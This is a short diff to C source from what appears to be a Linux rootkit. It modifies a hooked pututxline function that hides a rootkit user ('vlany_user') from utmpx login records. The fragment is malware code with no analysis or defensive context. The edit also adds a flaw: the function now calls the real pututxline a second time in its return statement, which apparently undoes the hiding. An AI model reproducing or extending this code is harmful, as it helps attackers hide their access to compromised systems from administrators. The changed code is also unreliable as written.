@@ -6,8 +6,7 @@ struct utmpx *pututxline(const struct utmpx *utx)
 
     HOOK(old_pututxline, CPUTUTXLINE);
 
-    struct utmpx *tmp;
-    tmp = old_pututxline(utx);
+    struct utmpx *tmp = old_pututxline(utx);
 
     if(tmp && tmp->ut_user != NULL)
     {
@@ -16,5 +15,5 @@ struct utmpx *pututxline(const struct utmpx *utx)
         CLEAN(vlany_user);
     }
 
-    return tmp;
+    return old_pututxline(utx);
 }
